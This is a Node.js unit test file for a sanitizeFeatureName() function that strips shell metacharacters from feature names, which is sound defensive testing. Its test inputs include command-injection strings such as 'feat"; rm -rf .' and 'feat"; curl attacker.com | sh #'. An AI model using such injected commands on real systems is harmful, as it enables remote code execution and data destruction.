#!/usr/bin/env node
// Unit tests for mcp/lib/sanitize.js sanitizeFeatureName()
// Run: node mcp/sanitize-test.mjs

import { sanitizeFeatureName } from './lib/sanitize.js';

let passed = 0;
let failed = 0;

function assert(condition, label) {
  if (condition) {
    console.log('  PASS  ' + label);
    passed++;
  } else {
    console.error('  FAIL  ' + label);
    failed++;
  }
}

console.log('\n── sanitize-test.mjs ────────────────────────────────────────────────────');

// 1. Normal feature names pass through unchanged
assert(sanitizeFeatureName('add OAuth login') === 'add OAuth login',
  'normal name: unchanged');
assert(sanitizeFeatureName('fix price alert bug') === 'fix price alert bug',
  'normal name with spaces: unchanged');

// 2. Double-quote stripped (closes shell string)
assert(!sanitizeFeatureName('feat"; rm -rf .').includes('"'),
  'double-quote: stripped (prevents closing the shell string)');
{
  // After stripping ", the text "; rm -rf ." becomes "; rm -rf ." inside the
  // quoted argument — the semicolon is now inside quotes and not a separator.
  const r = sanitizeFeatureName('feat"; rm -rf .');
  assert(!r.includes('"') && r.startsWith('feat'),
    'injection after double-quote: quote removed, safe prefix preserved');
}

// 3. Dollar sign stripped (prevents variable/command substitution)
{
  const r = sanitizeFeatureName('feat $HOME $(whoami)');
  assert(!r.includes('$'), 'dollar sign: stripped');
}

// 4. Backtick stripped (prevents command substitution)
{
  const r = sanitizeFeatureName('feat `whoami`');
  assert(!r.includes('`'), 'backtick: stripped');
}

// 5. Backslash stripped (prevents escape sequences)
{
  const r = sanitizeFeatureName('feat\\n evil');
  assert(!r.includes('\\'), 'backslash: stripped');
}

// 6. Newline stripped
{
  const r = sanitizeFeatureName('feat\nmalicious second line');
  assert(!r.includes('\n'), 'newline: stripped');
}

// 7. Carriage return stripped
{
  const r = sanitizeFeatureName('feat\rinjection');
  assert(!r.includes('\r'), 'carriage return: stripped');
}

// 8. Control characters stripped
{
  const r = sanitizeFeatureName('feat\x00null\x1funit');
  assert(!r.includes('\x00') && !r.includes('\x1f'), 'control chars: stripped');
}

// 9. Compound injection attempt
{
  const malicious = 'feat"; curl attacker.com | sh #';
  const r = sanitizeFeatureName(malicious);
  assert(!r.includes('"'), 'compound injection: double-quote stripped');
  assert(r.includes('feat'), 'compound injection: safe prefix preserved');
}

// 10. Non-string input returns empty string
assert(sanitizeFeatureName(null) === '', 'null: returns empty string');
assert(sanitizeFeatureName(undefined) === '', 'undefined: returns empty string');
assert(sanitizeFeatureName(42) === '', 'number: returns empty string');

// 11. Long feature name is truncated to 200 chars
{
  const long = 'a'.repeat(300);
  assert(sanitizeFeatureName(long).length === 200, 'long name: truncated to 200');
}

// 12. Empty string stays empty
assert(sanitizeFeatureName('') === '', 'empty string: stays empty');

// 13. Whitespace-only is trimmed to empty
assert(sanitizeFeatureName('   ') === '', 'whitespace-only: trimmed to empty');

// 14. Normal Unicode preserved (no over-stripping)
assert(sanitizeFeatureName('add støtte for æøå') === 'add støtte for æøå',
  'unicode chars: preserved');

console.log('');
console.log(`  ${passed + failed} tests: ${passed} passed, ${failed} failed`);
process.exit(failed > 0 ? 1 : 0);
